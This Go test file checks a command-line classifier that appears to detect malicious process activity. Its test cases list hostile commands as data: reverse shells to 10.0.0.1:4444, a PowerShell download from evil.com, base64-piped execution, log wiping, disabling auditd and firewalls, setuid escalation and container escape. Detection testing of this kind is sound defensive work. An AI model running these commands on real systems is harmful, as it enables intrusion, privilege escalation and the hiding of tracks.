package repositories

import "testing"

func TestClassifyCmdline_ReverseShell(t *testing.T) {
	tests := []struct {
		cmd, exe, want string
	}{
		{"bash -c '/dev/tcp/10.0.0.1/4444'", "bash", "reverse_shell"},
		{"sh -c 'nc 10.0.0.1 4444'", "sh", "reverse_shell"},
		{"bash -c 'socat TCP:10.0.0.1:4444 EXEC:/bin/bash'", "bash", "reverse_shell"},
	}
	for _, tc := range tests {
		got := classifyCmdline(tc.cmd, tc.exe)
		if got != tc.want {
			t.Errorf("classifyCmdline(%q, %q) = %q, want %q", tc.cmd, tc.exe, got, tc.want)
		}
	}
}

func TestClassifyCmdline_ObfuscatedExec(t *testing.T) {
	tests := []struct {
		cmd, exe string
	}{
		{"bash -c 'echo aGVsbG8= | base64 -d | bash'", "bash"},
		{"echo aGVsbG8= |base64 -d", "echo"},
		{"bash -c 'cat payload.b64 | base64 --decode |bash'", "bash"},
	}
	for _, tc := range tests {
		got := classifyCmdline(tc.cmd, tc.exe)
		if got != "obfuscated_exec" {
			t.Errorf("classifyCmdline(%q, %q) = %q, want obfuscated_exec", tc.cmd, tc.exe, got)
		}
	}
}

func TestClassifyCmdline_PowerShellEncoded(t *testing.T) {
	tests := []struct {
		cmd, exe string
	}{
		{"powershell -encodedcommand JABjAD0AbgBlAHcA", "powershell"},
		{"pwsh -enc abc123", "pwsh"},
		{"powershell -e aGVsbG8=", "powershell"},
	}
	for _, tc := range tests {
		got := classifyCmdline(tc.cmd, tc.exe)
		if got != "powershell_encoded" {
			t.Errorf("classifyCmdline(%q, %q) = %q, want powershell_encoded", tc.cmd, tc.exe, got)
		}
	}
}

func TestClassifyCmdline_PowerShellDownload(t *testing.T) {
	cmd := "powershell -c (new-object net.webclient).downloadstring('http://evil.com/payload.ps1')"
	got := classifyCmdline(cmd, "powershell")
	if got != "powershell_download" {
		t.Errorf("classifyCmdline() = %q, want powershell_download", got)
	}
}

func TestClassifyCmdline_PythonExec(t *testing.T) {
	tests := []struct {
		cmd, exe string
	}{
		{"python3 -c \"import os; exec('whoami')\"", "python3"},
		{"python -c 'eval(input())'", "python"},
	}
	for _, tc := range tests {
		got := classifyCmdline(tc.cmd, tc.exe)
		if got != "python_exec" {
			t.Errorf("classifyCmdline(%q, %q) = %q, want python_exec", tc.cmd, tc.exe, got)
		}
	}
}

func TestClassifyCmdline_PythonReverseShell(t *testing.T) {
	// Use a command that triggers socket/connect without also triggering exec(/eval/import
	// (those have higher priority in the classifyCmdline switch).
	cmd := "python3 reverse-shell.py"
	got := classifyCmdline(cmd, "python3")
	if got != "python_reverse_shell" {
		t.Errorf("classifyCmdline() = %q, want python_reverse_shell", got)
	}
}

func TestClassifyCmdline_ScriptExec(t *testing.T) {
	tests := []struct {
		cmd, exe string
	}{
		{"perl -e 'exec(\"/bin/bash\")'", "perl"},
		{"ruby -e 'system(\"id\")'", "ruby"},
	}
	for _, tc := range tests {
		got := classifyCmdline(tc.cmd, tc.exe)
		if got != "script_exec" {
			t.Errorf("classifyCmdline(%q, %q) = %q, want script_exec", tc.cmd, tc.exe, got)
		}
	}
}

func TestClassifyCmdline_LogTampering(t *testing.T) {
	tests := []string{
		"history -c",
		"unset histfile",
		"export histfile=/dev/null",
		"rm -rf /var/log/auth",
	}
	for _, cmd := range tests {
		got := classifyCmdline(cmd, "bash")
		if got != "log_tampering" {
			t.Errorf("classifyCmdline(%q) = %q, want log_tampering", cmd, got)
		}
	}
}

func TestClassifyCmdline_DefenseDisabled(t *testing.T) {
	tests := []string{
		"systemctl stop auditd",
		"pkill auditd",
		"setenforce 0",
		"ufw disable",
	}
	for _, cmd := range tests {
		got := classifyCmdline(cmd, "bash")
		if got != "defense_disabled" {
			t.Errorf("classifyCmdline(%q) = %q, want defense_disabled", cmd, got)
		}
	}
}

func TestClassifyCmdline_SudoShell(t *testing.T) {
	tests := []struct {
		cmd, exe string
	}{
		{"sudo bash", "/usr/bin/sudo"},
		{"sudo -s", "/bin/sudo"},
		{"sudo /bin/bash", "/usr/bin/sudo"},
	}
	for _, tc := range tests {
		got := classifyCmdline(tc.cmd, tc.exe)
		if got != "sudo_shell" {
			t.Errorf("classifyCmdline(%q, %q) = %q, want sudo_shell", tc.cmd, tc.exe, got)
		}
	}
}

func TestClassifyCmdline_SetuidSet(t *testing.T) {
	tests := []string{
		"chmod +s /bin/bash",
		"chmod 4755 /tmp/escalate",
		"chmod u+s /usr/bin/vim",
	}
	for _, cmd := range tests {
		got := classifyCmdline(cmd, "chmod")
		if got != "setuid_set" {
			t.Errorf("classifyCmdline(%q) = %q, want setuid_set", cmd, got)
		}
	}
}

func TestClassifyCmdline_ContainerEscape(t *testing.T) {
	tests := []string{
		"nsenter --target 1 --mount --uts --ipc --net --pid -- bash",
		"docker run --privileged -it ubuntu bash",
	}
	for _, cmd := range tests {
		got := classifyCmdline(cmd, "nsenter")
		if got != "container_escape" {
			t.Errorf("classifyCmdline(%q) = %q, want container_escape", cmd, got)
		}
	}
}

func TestClassifyCmdline_Benign(t *testing.T) {
	tests := []struct {
		cmd, exe string
	}{
		{"ls -la /home", "ls"},
		{"grep -r 'foo' /etc/", "grep"},
		{"cat /etc/hostname", "cat"},
		{"apt-get update", "apt-get"},
	}
	for _, tc := range tests {
		got := classifyCmdline(tc.cmd, tc.exe)
		if got != "" {
			t.Errorf("classifyCmdline(%q, %q) = %q, want empty (benign)", tc.cmd, tc.exe, got)
		}
	}
}

func TestMatchAny(t *testing.T) {
	if !matchAny("hello world foo", "foo", "bar") {
		t.Error("matchAny should find 'foo'")
	}
	if matchAny("hello world", "xyz", "abc") {
		t.Error("matchAny should not find absent substrings")
	}
	if matchAny("", "a") {
		t.Error("matchAny on empty string should return false")
	}
	if matchAny("abc") {
		t.Error("matchAny with no substrings should return false")
	}
}
